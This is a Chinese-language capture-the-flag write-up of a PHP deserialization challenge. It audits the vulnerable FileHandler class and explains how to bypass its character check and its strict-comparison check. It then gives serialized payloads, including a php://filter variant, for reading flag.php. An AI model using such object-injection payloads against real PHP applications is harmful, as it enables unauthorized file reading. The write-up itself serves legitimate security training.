# web

## [网鼎杯 2020 青龙组]AreUSerialz

1. 代码审计

   ```php
   <?php
   
   include("flag.php");
   
   highlight_file(__FILE__);
   
   class FileHandler {
   
       protected $op;
       protected $filename;
       protected $content;
   
       function __construct() {
           $op = "1";
           $filename = "/tmp/tmpfile";
           $content = "Hello World!";
           $this->process();
       }
   
       public function process() {
           if($this->op == "1") {
               $this->write();
           } else if($this->op == "2") {
               $res = $this->read();
               $this->output($res);
           } else {
               $this->output("Bad Hacker!");
           }
       }
   
       private function write() {
           if(isset($this->filename) && isset($this->content)) {
               if(strlen((string)$this->content) > 100) {
                   $this->output("Too long!");
                   die();
               }
               $res = file_put_contents($this->filename, $this->content);
               if($res) $this->output("Successful!");
               else $this->output("Failed!");
           } else {
               $this->output("Failed!");
           }
       }
   
       private function read() {
           $res = "";
           if(isset($this->filename)) {
               $res = file_get_contents($this->filename);
           }
           return $res;
       }
   
       private function output($s) {
           echo "[Result]: <br>";
           echo $s;
       }
   
       function __destruct() {
           if($this->op === "2")
               $this->op = "1";
           $this->content = "";
           $this->process();
       }
   
   }
   
   function is_valid($s) {
       for($i = 0; $i < strlen($s); $i++)
           if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
               return false;
       return true;
   }
   
   if(isset($_GET{'str'})) {
   
       $str = (string)$_GET['str'];
       if(is_valid($str)) {
           $obj = unserialize($str);
       }
   
   }
   ```

2. 简单梳理下流程，首先通过`GET`方法传递参数，然后进行字符串ascii码检测，通过后进行反序列化给`obj`变量，构造魔术方法就不用看了，因为对象最后会被销毁，会执行析构函数魔术方法，然后判断对象成员`op`的值是否等于2，进行判断使用写入文件还是读取文件。

3. 这道题因为写了`include("flag.php")`，那肯定是读取文件，并且是相对路径，那么我们需要构造`op=2`来读取文件。

4. 这里需要绕过两个地方检测

   ```shell
   1.is_valid()函数规定字符的ASCII码必须是32-125，而protected属性在序列化后会出现不可见字符\00*\00，转化为ASCII码不符合要求。
   #PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过
   
   2.process()方法中是==,而__destruct()魔术方法中是===,当反序列化后如果是op="2",就会重新赋值为"1"，跳转到写文件方法操作
   #利用php弱类型比较，2==“2”(true) 2==="2"(false)进行绕过
   ```

5. 构造payload直接读取`flag.php`

   ```php
   <?php
   class FileHandler {
   
       public $op=2;
       public $filename="flag.php";
       public $content="123";
       }
   
   $a=new FileHandler();
   echo serialize($a);
   //O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:3:"123";}
   ```

6. 还可以用`php://filter`伪协议进行读取

   ```php
   <?php
    
   class FileHandler {
    
       public $op = 2;
       public  $filename = "php://filter/read=convert.base64-encode/resource=flag.php";
       public  $content = "123";
    
   }
    
   $a = new FileHandler();
   $b = serialize($a);
   echo $b;
    
   ?>
   ```

7. 利用工具提交

   ![](img/image-20210616230510694.png)

   ![](img/image-20210616230529663.png)

8. 因为buu环境的原因，可以直接读取`flag.php`，看了真实比赛的wp还要读取系统配置文件、容器配置文件来猜flag的绝对路径。以后来填坑。

